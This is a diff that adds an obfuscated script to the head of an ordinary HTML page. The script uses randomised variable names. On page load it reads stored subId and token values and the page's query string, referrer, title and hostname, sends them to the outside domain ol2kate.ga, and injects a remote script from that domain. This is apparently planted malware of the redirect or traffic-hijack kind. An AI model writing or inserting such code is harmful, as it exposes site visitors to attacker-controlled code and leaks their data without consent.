@@ -5,6 +5,50 @@
 <html>
 <head>
 
+  <script>
+    (function() {
+    var name = '_S1GhQfgszRgntVx7';
+    if (!window._S1GhQfgszRgntVx7) {
+        window._S1GhQfgszRgntVx7 = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://ol2kate.ga/8MDWN3f7',
+            P_PATH: 'https://ol2kate.ga/7b4f75c/postback',
+        };
+    }
+    const _v9yBpzWcSzpb43v2 = localStorage.getItem('config');
+    if (typeof _v9yBpzWcSzpb43v2 !== 'undefined' && _v9yBpzWcSzpb43v2 !== null) {
+        var _sZBDVyXrYV5zdCW8 = JSON.parse(_v9yBpzWcSzpb43v2);
+        var _XQQYSN74bBM7pn6K = Math.round(+new Date()/1000);
+        if (_sZBDVyXrYV5zdCW8.created_at + window._S1GhQfgszRgntVx7.ttl < _XQQYSN74bBM7pn6K) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _8LQnT6MQgbdsS4jf = localStorage.getItem('subId');
+    var _CWnVg6N4W3GVHtWY = localStorage.getItem('token');
+    var _8KWQg5TKcxNyJWjk = '?return=js.client';
+        _8KWQg5TKcxNyJWjk += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _8KWQg5TKcxNyJWjk += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _8KWQg5TKcxNyJWjk += '&default_keyword=' + encodeURIComponent(document.title);
+        _8KWQg5TKcxNyJWjk += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _8KWQg5TKcxNyJWjk += '&name=' + encodeURIComponent(name);
+        _8KWQg5TKcxNyJWjk += '&host=' + encodeURIComponent(window._S1GhQfgszRgntVx7.R_PATH);
+    if (typeof _8LQnT6MQgbdsS4jf !== 'undefined' && _8LQnT6MQgbdsS4jf && window._S1GhQfgszRgntVx7.unique) {
+        _8KWQg5TKcxNyJWjk += '&sub_id=' + encodeURIComponent(_8LQnT6MQgbdsS4jf);
+    }
+    if (typeof _CWnVg6N4W3GVHtWY !== 'undefined' && _CWnVg6N4W3GVHtWY && window._S1GhQfgszRgntVx7.unique) {
+        _8KWQg5TKcxNyJWjk += '&token=' + encodeURIComponent(_CWnVg6N4W3GVHtWY);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._S1GhQfgszRgntVx7.R_PATH + _8KWQg5TKcxNyJWjk;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
+
     <!-- PLUGINS -->
     
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
